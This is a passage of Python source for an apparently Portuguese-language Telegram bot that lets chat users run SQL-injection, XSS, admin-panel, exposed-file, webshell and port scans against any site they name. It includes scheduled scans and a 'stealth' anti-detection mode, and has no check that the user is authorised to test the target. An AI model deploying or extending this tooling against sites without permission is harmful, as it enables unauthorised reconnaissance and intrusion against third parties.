    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /sitemap &lt;url&gt;\nExemplo: /sitemap google.com")
        return
    target = args[0]
    log_command(user_id, username, "sitemap", target)
    send_msg(user_id, chat_id, f"🔍 <b>Analisando sitemap</b> em {escape_html(extract_hostname(target))}...")
    result = tool_sitemap(target)
    db_cache_set("sitemap", target, result)
    send_msg(user_id, chat_id, result)

def handle_tech(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /tech &lt;url&gt;\nExemplo: /tech google.com")
        return
    target = args[0]
    log_command(user_id, username, "tech", target)
    send_msg(user_id, chat_id, f"🔍 <b>Detectando tecnologias</b> em {escape_html(extract_hostname(target))}...")
    result = tool_tech_detect(target)
    db_cache_set("tech", target, result)
    send_msg(user_id, chat_id, result)

def handle_exposed(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /exposed &lt;url&gt;\nExemplo: /exposed google.com")
        return
    target = args[0]
    log_command(user_id, username, "exposed", target)
    send_msg(user_id, chat_id, f"🔍 <b>Buscando arquivos expostos</b> em {escape_html(extract_hostname(target))}...")
    result = tool_exposed_files(target)
    db_cache_set("exposed", target, result)
    send_msg(user_id, chat_id, result)

def handle_backup(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /backup &lt;url&gt;\nExemplo: /backup google.com")
        return
    target = args[0]
    log_command(user_id, username, "backup", target)
    send_msg(user_id, chat_id, f"🔍 <b>Buscando backups</b> em {escape_html(extract_hostname(target))}...")
    result = tool_backup_finder(target)
    db_cache_set("backup", target, result)
    send_msg(user_id, chat_id, result)

def handle_api(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /api &lt;url&gt;\nExemplo: /api google.com")
        return
    target = args[0]
    log_command(user_id, username, "api", target)
    send_msg(user_id, chat_id, f"🔍 <b>Descobrindo APIs</b> em {escape_html(extract_hostname(target))}...")
    result = tool_api_discovery(target)
    db_cache_set("api", target, result)
    send_msg(user_id, chat_id, result)

def handle_shell(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /shell &lt;url&gt;\nExemplo: /shell google.com")
        return
    target = args[0]
    log_command(user_id, username, "shell", target)
    send_msg(user_id, chat_id, f"🔍 <b>Huntando webshells</b> em {escape_html(extract_hostname(target))}...")
    result = tool_webshell_hunter(target)
    db_cache_set("shell", target, result)
    send_msg(user_id, chat_id, result)

def handle_config(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /config &lt;url&gt;\nExemplo: /config google.com")
        return
    target = args[0]
    log_command(user_id, username, "config", target)
    send_msg(user_id, chat_id, f"🔍 <b>Buscando configs expostas</b> em {escape_html(extract_hostname(target))}...")
    result = tool_config_scanner(target)
    db_cache_set("config", target, result)
    send_msg(user_id, chat_id, result)

def handle_traceroute(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /traceroute &lt;ip&gt;\nExemplo: /traceroute 8.8.8.8")
        return
    target = args[0]
    log_command(user_id, username, "traceroute", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Traceroute</b> para {escape_html(clean_target)}...")
    try:
        # Try using traceroute/tracert command
        if os.name == 'nt':
            result = subprocess.run(['tracert', '-d', '-w', '2000', '-h', '15', clean_target], capture_output=True, text=True, timeout=30)
        else:
            result = subprocess.run(['traceroute', '-n', '-w', '2', '-m', '15', clean_target], capture_output=True, text=True, timeout=30)
        output = result.stdout.strip()
        if output:
            lines = output.split('\n')[:15]
            msg = f"🛣️ <b>Traceroute</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n<code>" + escape_html('\n'.join(lines)) + "</code>\n━━━━━━━━━━━━━━━━━━━━━━"
            send_msg(user_id, chat_id, msg)
        else:
            send_msg(user_id, chat_id, "❌ Traceroute não disponível neste servidor.")
    except subprocess.TimeoutExpired:
        send_msg(user_id, chat_id, "⏱️ Traceroute expirou (timeout 30s).")
    except Exception as e:
                send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")


def handle_whois(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /whois &lt;domain&gt;\nExemplo: /whois google.com")
        return
    target = args[0]
    domain = extract_hostname(target)
    log_command(user_id, username, "whois", domain)
    send_msg(user_id, chat_id, f"🔍 <b>Whois</b> de {escape_html(domain)}...")
    results = f"📋 <b>Whois</b> — {escape_html(domain)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    try:
        resp = _safe_get(f"https://api.allorigins.win/raw?url=https://www.whois.com/whois/{domain}", timeout=10)
        if resp and resp.status_code == 200:
            text = resp.text
            # Extract key fields
            fields = {
                'Registrar': ['Registrar:', 'Registrar Name:'],
                'Creation Date': ['Creation Date:', 'Creation date:'],
                'Expiry Date': ['Registry Expiry Date:', 'Expiry Date:', 'Expiration Date:'],
                'Status': ['Domain Status:', 'Status:'],
                'Name Server': ['Name Server:', 'Name Server:', 'Nserver:'],
                'DNSSEC': ['DNSSEC:', 'DNSSEC:'],
            }
            for label, keys in fields.items():
                for key in keys:
                    idx = text.find(key)
                    if idx != -1:
                        val = text[idx + len(key):].split('\n')[0].strip()
                        if val and len(val) < 200:
                            results += f"📌 <b>{label}:</b> {escape_html(val)}\n"
                            break
        else:
            # Fallback: use ip-api.com for basic info
            resp2 = _safe_get(f"http://ip-api.com/json/{domain}?fields=query,status,country,isp,org,as", timeout=5)
            if resp2 and resp2.status_code == 200:
                data = resp2.json()
                if data.get('status') == 'success':
                    results += f"📌 <b>IP:</b> {escape_html(data.get('query', 'N/D'))}\n"
                    results += f"📌 <b>ISP:</b> {escape_html(data.get('isp', 'N/D'))}\n"
                    results += f"📌 <b>Org:</b> {escape_html(data.get('org', 'N/D'))}\n"
                    results += f"📌 <b>ASN:</b> {escape_html(data.get('as', 'N/D'))}\n"
    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e))}"
    results += "━━━━━━━━━━━━━━━━━━━━━━"
    send_msg(user_id, chat_id, results)

def handle_ip(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /ip &lt;ip&gt;\nExemplo: /ip 8.8.8.8")
        return
    target = args[0]
    log_command(user_id, username, "ip", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>GeoIP</b> de {escape_html(clean_target)}...")
    results = f"📍 <b>GeoIP Avançado</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    try:
        resp = _safe_get(f"http://ip-api.com/json/{clean_target}?fields=status,message,country,regionName,city,lat,lon,timezone,isp,org,as,query,reverse,hosting,proxy,mobile", timeout=5)
        if resp and resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                results += f"🌍 <b>País:</b> {escape_html(data.get('country', 'N/D'))}\n"
                results += f"📍 <b>Região:</b> {escape_html(data.get('regionName', 'N/D'))}\n"
                results += f"🏙️ <b>Cidade:</b> {escape_html(data.get('city', 'N/D'))}\n"
                results += f"📡 <b>ISP:</b> {escape_html(data.get('isp', 'N/D'))}\n"
                results += f"🌐 <b>Org:</b> {escape_html(data.get('org', 'N/D'))}\n"
                results += f"🔢 <b>ASN:</b> {escape_html(data.get('as', 'N/D'))}\n"
                results += f"🕐 <b>Timezone:</b> {escape_html(data.get('timezone', 'N/D'))}\n"
                if data.get('reverse'):
                    results += f"🔄 <b>Reverse:</b> {escape_html(data['reverse'])}\n"
                # Security indicators
                sec_flags = []
                if data.get('hosting'): sec_flags.append("🖥️ Hosting")
                if data.get('proxy'): sec_flags.append("🔒 Proxy/VPN")
                if data.get('mobile'): sec_flags.append("📱 Mobile")
                if sec_flags:
                    results += f"\n🔍 <b>Tipo:</b> {' '.join(sec_flags)}\n"
            else:
                results += f"❌ {escape_html(data.get('message', 'Query failed'))}"
    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e))}"
    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    send_msg(user_id, chat_id, results)

def handle_rate(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /rate &lt;url&gt;\nExemplo: /rate google.com")
        return
    target = args[0]
    log_command(user_id, username, "rate", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Avaliando segurança</b> de {escape_html(clean_target)}...")
    url = clean_target
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    score = 100
    details = []
    try:
        resp = _safe_get(url, timeout=8)
        if not resp:
            send_msg(user_id, chat_id, "❌ Não foi possível acessar o site")
            return
        headers = resp.headers
        body = resp.text.lower()
        # Score deductions
        if not headers.get('Strict-Transport-Security'):
            score -= 15; details.append("❌ HSTS ausente (-15)")
        if not headers.get('X-Content-Type-Options'):
            score -= 10; details.append("❌ X-Content-Type-Options ausente (-10)")
        if not headers.get('X-Frame-Options'):
            score -= 10; details.append("❌ X-Frame-Options ausente (-10)")
        if not headers.get('Content-Security-Policy'):
            score -= 15; details.append("❌ CSP ausente (-15)")
        if not headers.get('Referrer-Policy'):
            score -= 5; details.append("❌ Referrer-Policy ausente (-5)")
        if headers.get('Server', '').lower() in ('nginx', 'apache'):
            pass  # normal
        if 'jquery' in body:
            score -= 5; details.append("⚠️ jQuery detectado (potencial XSS) (-5)")
        if 'wp-login.php' in body or 'wp-content' in body:
            score -= 10; details.append("⚠️ WordPress detectado (-10)")
        # Check HTTPS
        if url.startswith('http://') and not url.startswith('https://'):
            score -= 20; details.append("❌ Sem HTTPS (-20)")
        score = max(0, min(100, score))
        if score >= 90: grade = "🅰️ A — Excelente"
        elif score >= 75: grade = "🅱️ B — Bom"
        elif score >= 60: grade = "🇨 C — Razoável"
        elif score >= 40: grade = "🇩 D — Fraco"
        elif score >= 20: grade = "🇪 E — Crítico"
        else: grade = "🇫 F — Péssimo"
        msg = f"📊 <b>Nota de Segurança</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += f"🏆 <b>{score}/100</b> — {grade}\n\n"
        msg += "<b>Detalhes:</b>\n"
        for d in details[:8]:
            msg += f"  {d}\n"
        if not details:
            msg += "  ✅ Tudo OK!\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━"
        send_msg(user_id, chat_id, msg)
    except Exception as e:
        send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_compare(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args or len(args) < 2:
        send_msg(user_id, chat_id, "❌ Use: /compare &lt;url1&gt; &lt;url2&gt;\nExemplo: /compare google.com example.com")
        return
    target1 = args[0]
    target2 = args[1]
    log_command(user_id, username, "compare", f"{target1} vs {target2}")
    clean1 = extract_hostname(target1)
    clean2 = extract_hostname(target2)
    send_msg(user_id, chat_id, f"🔍 <b>Comparando</b> {escape_html(clean1)} vs {escape_html(clean2)}...")
    def get_headers_score(url):
        u = url
        if not u.startswith(('http://', 'https://')):
            u = 'http://' + u
        try:
            r = _safe_get(u, timeout=5)
            if not r: return 0
            h = r.headers
            s = 0
            if h.get('Strict-Transport-Security'): s += 20
            if h.get('X-Content-Type-Options'): s += 15
            if h.get('X-Frame-Options'): s += 15
            if h.get('Content-Security-Policy'): s += 25
            if h.get('Referrer-Policy'): s += 10
            if h.get('X-XSS-Protection'): s += 10
            if h.get('Permissions-Policy'): s += 5
            return s
        except: return 0
    s1 = get_headers_score(target1)
    s2 = get_headers_score(target2)
    msg = f"⚔️ <b>Comparação</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    msg += f"🌐 <b>{escape_html(clean1)}</b>\n"
    msg += f"   📊 Score: {s1}/100\n\n"
    msg += f"🌐 <b>{escape_html(clean2)}</b>\n"
    msg += f"   📊 Score: {s2}/100\n\n"
    winner = clean1 if s1 > s2 else clean2
    msg += f"🏆 <b>Mais seguro:</b> {escape_html(winner)} ({max(s1,s2)} pts)\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━"
    send_msg(user_id, chat_id, msg)

def handle_history(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /history &lt;url&gt;\nExemplo: /history google.com")
        return
    target = args[0]
    log_command(user_id, username, "history", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Histórico de scans</b> em {escape_html(clean_target)}...")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT cmd, created_at FROM scan_cache WHERE target LIKE ? ORDER BY created_at DESC LIMIT 15", (f"%{clean_target}%",))
            rows = c.fetchall()
            if rows:
                msg = f"📋 <b>Histórico de Scans</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
                for r in rows:
                    ts = datetime.fromtimestamp(r['created_at']).strftime('%d/%m %H:%M') if r['created_at'] else 'N/D'
                    msg += f"  → /{escape_html(r['cmd'])} em {ts}\n"
                msg += "━━━━━━━━━━━━━━━━━━━━━━"
                send_msg(user_id, chat_id, msg)
            else:
                send_msg(user_id, chat_id, "ℹ️ Nenhum scan encontrado para este target.")
    except Exception as e:
        send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_top(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not check_owner(user_id, chat_id):
        return
    log_command(user_id, username, "top", "")
    send_msg(user_id, chat_id, "🔍 <b>Carregando top sites vulneráveis...</b>")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT target, COUNT(*) as scan_count FROM scan_cache GROUP BY target ORDER BY scan_count DESC LIMIT 15")
            rows = c.fetchall()
            if rows:
                msg = f"🏆 <b>Top Sites Mais Escaneados</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                for i, r in enumerate(rows, 1):
                    emoji = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else "📌"
                    msg += f"{emoji} <b>#{i}</b> {escape_html(r['target'][:50])} ({r['scan_count']} scans)\n"
                msg += "━━━━━━━━━━━━━━━━━━━━━━"
                send_msg(user_id, chat_id, msg)
            else:
                send_msg(user_id, chat_id, "ℹ️ Nenhum scan registrado ainda.")
    except Exception as e:
        send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_pdf(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if len(args) < 2:
        send_msg(user_id, chat_id, "❌ Use: /pdf &lt;comando&gt; &lt;url&gt;\nExemplo: /pdf sqli google.com/?id=1")
        return
    scan_cmd = args[0]
    target = args[1]
    log_command(user_id, username, "pdf", f"{scan_cmd} {target}")
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Gerando relatório PDF</b> de /{scan_cmd} em {escape_html(clean_target)}...")
    # Run the scan first
    tool_map = {
        'sqli': tool_sqli, 'xss': tool_xss_scanner, 'admin': tool_admin_finder,
        'ports': tool_port_scanner, 'dirs': tool_directory_scanner,
        'sub': tool_subdomain_scanner, 'wp': tool_wordpress_scanner,
        'dns': tool_dns_tools, 'cms': tool_cms_detector,
        'reverse': tool_reverse_ip, 'ftpssh': tool_ftp_ssh,
        'info': tool_website_info, 'emails': tool_email_scraper,
        'ssl': tool_ssl_audit, 'headers': tool_headers_analysis,
        'cors': tool_cors_test, 'robots': tool_robots_txt,
        'sitemap': tool_sitemap, 'tech': tool_tech_detect,
        'exposed': tool_exposed_files, 'backup': tool_backup_finder,
        'api': tool_api_discovery, 'shell': tool_webshell_hunter,
        'config': tool_config_scanner,
    }
    tool_fn = tool_map.get(scan_cmd)
    if not tool_fn:
        lang = get_user_lang(user_id)
        if lang == 'en':
            send_msg(user_id, chat_id, f"❌ Command /{scan_cmd} not supported for PDF.")
        elif lang == 'es':
            send_msg(user_id, chat_id, f"❌ Comando /{scan_cmd} no soportado para PDF.")
        else:
            send_msg(user_id, chat_id, f"❌ Comando /{scan_cmd} não suportado para PDF.")
        return
    try:
        result = tool_fn(target)
        # Strip HTML tags for plain text report
        clean_result = result
        for tag in ['<b>', '</b>', '<code>', '</code>']:
            clean_result = clean_result.replace(tag, '')
        clean_result = re.sub(r'<[^>]+>', '', clean_result)
        report = f"MTH Security - Relatório de Scan\n"
        report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Commando: /{scan_cmd} {target}\n"
        report += f"Target: {clean_target}\n"
        report += "=" * 60 + "\n\n"
        report += clean_result
        success = send_document(chat_id, report, f"scan_report_{scan_cmd}_{clean_target}.txt")
        if success:
            send_msg(user_id, chat_id, "📄 <b>Relatório exportado com sucesso!</b>")
        else:
            send_msg(user_id, chat_id, "❌ Falha ao enviar o relatório.")
            return
    except Exception as e:
        send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")
        return


def handle_schedule(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if len(args) < 3:
        send_msg(user_id, chat_id, "❌ Use: /schedule &lt;minutos&gt; &lt;comando&gt; &lt;url&gt;\nExemplo: /schedule 30 sqli google.com/?id=1")
        return
    try:
        minutes = int(args[0])
        if minutes < 1:
            minutes = 1
    except ValueError:
        send_msg(user_id, chat_id, "❌ Minutos devem ser um número válido.")
        return
    scan_cmd = args[1]
    target = args[2]
    valid_cmds = ['sqli','xss','admin','panel','ports','dirs','sub','wp','dns','cms','reverse','ftpssh','info','emails','ssl','headers','cors','robots','sitemap','tech','exposed','backup','api','shell','config','scanall','deep','quick','http','sslchain']
    if scan_cmd not in valid_cmds:
        lang = get_user_lang(user_id)
        if lang == 'en':
            send_msg(user_id, chat_id, f"❌ Invalid command: /{scan_cmd}\nAccepted commands: {', '.join(valid_cmds[:10])}...")
        elif lang == 'es':
            send_msg(user_id, chat_id, f"❌ Comando inválido: /{scan_cmd}\nComandos aceptados: {', '.join(valid_cmds[:10])}...")
        else:
            send_msg(user_id, chat_id, f"❌ Comando inválido: /{scan_cmd}\nComandos aceitos: {', '.join(valid_cmds[:10])}...")
        return
    log_command(user_id, username, "schedule", f"{scan_cmd} {target} +{minutes}min")
    clean_target = extract_hostname(target)
    scheduled_time = time.time() + (minutes * 60)
    task_id = f"sched_{user_id}_{int(time.time())}"
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO scheduled_tasks (user_id, chat_id, cmd, target, scheduled_time, status, created_at) VALUES (?, ?, ?, ?, ?, 'pending', ?)",
                      (user_id, chat_id, scan_cmd, target, scheduled_time, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
            conn.commit()
        dt = datetime.fromtimestamp(scheduled_time).strftime('%d/%m %H:%M')
        send_msg(user_id, chat_id, f"⏰ <b>Scan agendado!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📋 /{scan_cmd} {clean_target}\n🕐 Execução: {dt} ({minutes}min)\n━━━━━━━━━━━━━━━━━━━━━━")
    except Exception as e:
        send_msg(user_id, chat_id, f"❌ Erro ao agendar: {escape_html(str(e))}")


# ═══════════════════════════════════════════════════════════════
#  V5.0: OWNER HANDLERS
# ═══════════════════════════════════════════════════════════════

def handle_maintenance(chat_id, user_id, username, first_name, last_name, args):
    global MAINTENANCE_MODE, MAINTENANCE_MSG
    log_user(user_id, username, first_name, last_name)
    if not check_owner(user_id, chat_id):
        return
    log_owner_command(user_id, username, "maintenance")
    audit_log(user_id, username, "maintenance", ' '.join(args) if args else "")
    if not args:
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        status = "ATIVADO" if MAINTENANCE_MODE else "DESATIVADO"
        send_msg(user_id, chat_id, f"🔧 <b>Modo manutenção {status}</b>")
    else:
        msg = ' '.join(args)
        if msg.lower() in ('on', 'enable', 'ligar'):
            MAINTENANCE_MODE = True
            send_msg(user_id, chat_id, f"🔧 <b>Modo manutenção ATIVADO</b>\nMensagem: {escape_html(msg)}")
        elif msg.lower() in ('off', 'disable', 'desligar'):
            MAINTENANCE_MODE = False
            MAINTENANCE_MSG = ""
            send_msg(user_id, chat_id, "🔧 <b>Modo manutenção DESATIVADO</b>")
        else:
            MAINTENANCE_MODE = True
            MAINTENANCE_MSG = msg
            send_msg(user_id, chat_id, f"🔧 <b>Modo manutenção ATIVADO</b>\nMensagem: {escape_html(msg)}")

def handle_cooldown(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not check_owner(user_id, chat_id):
        return
    log_owner_command(user_id, username, "cooldown")
    if not args or len(args) < 2:
        send_msg(user_id, chat_id, "❌ Use: /cooldown &lt;user_id&gt; &lt;limite&gt; [janela]\nExemplo: /cooldown 123456 5 60")
        return
    try:
        target_uid = int(args[0])
        limit = int(args[1])
        if limit < 1:
            limit = 1
        window = int(args[2]) if len(args) > 2 else 60
        if window < 1:
            window = 60
    except ValueError:
        send_msg(user_id, chat_id, "❌ Parâmetros inválidos. Use números inteiros.")
        return
    CUSTOM_RATE_LIMITS[target_uid] = {'limit': limit, 'window': window}
    audit_log(user_id, username, "cooldown", f"Set rate limit {limit}/{window}s for user {target_uid}")
    send_msg(user_id, chat_id, f"✅ <b>Rate limit configurado</b>\nUser: {target_uid}\nLimite: {limit} cmds / {window}s")

def handle_vip(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not check_owner(user_id, chat_id):
        return
    log_owner_command(user_id, username, "vip")
    if not args or len(args) < 2:
        send_msg(user_id, chat_id, "❌ Use: /vip &lt;add|remove&gt; &lt;user_id&gt;\nExemplo: /vip add 123456")
        return
    action = args[0].lower()
    try:
        target_uid = int(args[1])
    except ValueError:
        send_msg(user_id, chat_id, "❌ User ID inválido. Use um número inteiro.")
        return
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if action == 'add':
        VIP_USERS.add(target_uid)
        try:
            with sqlite3.connect(DB_PATH) as conn:
                c = conn.cursor()
                c.execute("INSERT OR REPLACE INTO vip_users (user_id, username, added_at, added_by) VALUES (?, ?, ?, ?)",
                          (target_uid, f"@{args[2]}" if len(args) > 2 else "N/D", now, user_id))
                conn.commit()
            audit_log(user_id, username, "vip_add", f"Added VIP user {target_uid}")
            send_msg(user_id, chat_id, f"✅ <b>VIP adicionado!</b>\nUser: {target_uid} — Sem rate limit, scans prioritários.")
        except Exception as e:
            send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")
            return
    elif action == 'remove':
        VIP_USERS.discard(target_uid)
        try:
            with sqlite3.connect(DB_PATH) as conn:
                c = conn.cursor()
                c.execute("DELETE FROM vip_users WHERE user_id = ?", (target_uid,))
                conn.commit()
            audit_log(user_id, username, "vip_remove", f"Removed VIP user {target_uid}")
            send_msg(user_id, chat_id, f"🚫 <b>VIP removido!</b>\nUser: {target_uid}")
        except Exception as e:
            send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")
            return
    else:
        send_msg(user_id, chat_id, "❌ Use: /vip &lt;add|remove&gt; &lt;user_id&gt;")
        return

def handle_viplist(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Lista todos os usuários VIP cadastrados"""
    log_user(user_id, username, first_name, last_name)
    if not check_owner(user_id, chat_id):
        return
    log_owner_command(user_id, username, "viplist")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("SELECT user_id, username, added_at, added_by FROM vip_users ORDER BY added_at DESC")
            rows = c.fetchall()
        if not rows:
            send_msg(user_id, chat_id, "📋 <b>VIP List</b>\n━━━━━━━━━━━━━━━━━━━━━━\n❌ Nenhum usuário VIP cadastrado.")
            return
        msg = "📋 <b>VIP List</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        for i, row in enumerate(rows, 1):
            uid = row[0]
            uname = row[1]
            # Fallback: look up username from users table
            if not uname or uname == 'N/D':
                try:
                    with sqlite3.connect(DB_PATH) as conn2:
                        c2 = conn2.cursor()
                        c2.execute("SELECT username FROM users WHERE id = ?", (uid,))
                        urow = c2.fetchone()
                        if urow and urow[0]:
                            uname = f"@{urow[0]}"
                        else:
                            uname = f"ID: {uid}"
                except:
                    uname = f"ID: {uid}"
            elif not uname.startswith('@'):
                uname = f"@{uname}"
            added = row[2] if row[2] else '?'
            by_id = row[3]
            by_name = OWNERS.get(by_id, f"User {by_id}")
            msg += f"{i}. <b>{uname}</b> (ID: {uid})\n"
            msg += f"   Add by: {by_name} | Data: {added}\n"
        msg += f"━━━━━━━━━━━━━━━━━━━━━━\n📊 Total: {len(rows)} VIP(s)"
        send_msg(user_id, chat_id, msg)
    except Exception as e:
        send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_log(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not check_owner(user_id, chat_id):
        return
    log_owner_command(user_id, username, "log")
    # This is the audit log command (detailed)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /log &lt;user_id&gt; ou /log audit\nExemplo: /log 123456")
        return
    query = args[0]
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            if query == 'audit':
                c.execute("SELECT * FROM audit_log ORDER BY timestamp DESC LIMIT 20")
                rows = c.fetchall()
                msg = "📋 <b>Audit Log (últimos 20)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                for r in rows:
                    msg += f"  [{r['timestamp']}] @{r['username']} — {r['action']}\n    {escape_html(r['details'][:80])}\n"
            else:
                target_uid = int(query)
                c.execute("SELECT timestamp, action, details FROM audit_log WHERE user_id = ? ORDER BY timestamp DESC LIMIT 20", (target_uid,))
                rows = c.fetchall()
                msg = f"📋 <b>Logs do usuário {target_uid}</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                for r in rows:
                    msg += f"  [{r['timestamp']}] {r['action']} — {escape_html(r['details'][:80])}\n"
                if not rows:
                    msg += "  ℹ️ Nenhum registro encontrado."
            msg += "━━━━━━━━━━━━━━━━━━━━━━"
            send_msg(user_id, chat_id, msg)
    except Exception as e:
        send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_clearlogs(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not check_owner(user_id, chat_id):
        return
    log_owner_command(user_id, username, "clearlogs")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("DELETE FROM logs WHERE timestamp < ?", (datetime.now().strftime("%Y-%m-%d") + " 00:00:00",))
            deleted = c.rowcount
            c.execute("DELETE FROM audit_log WHERE timestamp < ?", (datetime.now().strftime("%Y-%m-%d") + " 00:00:00",))
            audit_deleted = c.rowcount
            conn.commit()
        send_msg(user_id, chat_id, f"🗑️ <b>Logs limpos!</b>\nLogs antigos: {deleted}\nAudit logs: {audit_deleted}")
    except Exception as e:
        send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_broadcast(chat_id, user_id, username, first_name, last_name, args):
    """Schedule a broadcast for later (owner only)"""
    log_user(user_id, username, first_name, last_name)
    if not check_owner(user_id, chat_id):
        return
    log_owner_command(user_id, username, "broadcast")
    if len(args) < 2:
        send_msg(user_id, chat_id, "❌ Use: /broadcast &lt;minutos&gt; &lt;texto&gt;\nExemplo: /broadcast 60 Bot vai cair para manutenção em 1 hora")
        return
    try:
        minutes = int(args[0])
        if minutes < 1:
            minutes = 1
    except ValueError:
        send_msg(user_id, chat_id, "❌ Minutos devem ser um número válido.")
        return
    message_text = ' '.join(args[1:])
    scheduled_time = time.time() + (minutes * 60)
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO scheduled_tasks (user_id, chat_id, cmd, target, scheduled_time, status, created_at) VALUES (?, ?, 'broadcast', ?, ?, 'pending', ?)",
                      (user_id, chat_id, message_text, scheduled_time, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
            conn.commit()
        dt = datetime.fromtimestamp(scheduled_time).strftime('%d/%m %H:%M')
        send_msg(user_id, chat_id, f"📢 <b>Broadcast agendado!</b>\n🕐 Execução: {dt} ({minutes}min)\n━━━━━━━━━━━━━━━━━━━━━━")
    except Exception as e:
        send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")


# V5.0: Stealth and Notify handlers
def handle_stealth(chat_id, user_id, username, first_name, last_name, args):
    """Stealth scan mode - slower but anti-detect"""
    global STEALTH_MODE
    log_user(user_id, username, first_name, last_name)
    if len(args) < 2:
        send_msg(user_id, chat_id, "❌ Use: /stealth &lt;comando&gt; &lt;url&gt;\nExemplo: /stealth sqli google.com/?id=1")
        return
    scan_cmd = args[0]
    target = args[1]
    log_command(user_id, username, "stealth", f"{scan_cmd} {target}")
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🕵️ <b>Modo Stealth</b> ativado para /{scan_cmd} em {escape_html(clean_target)}...")
    # Enable stealth mode temporarily
    STEALTH_MODE = True
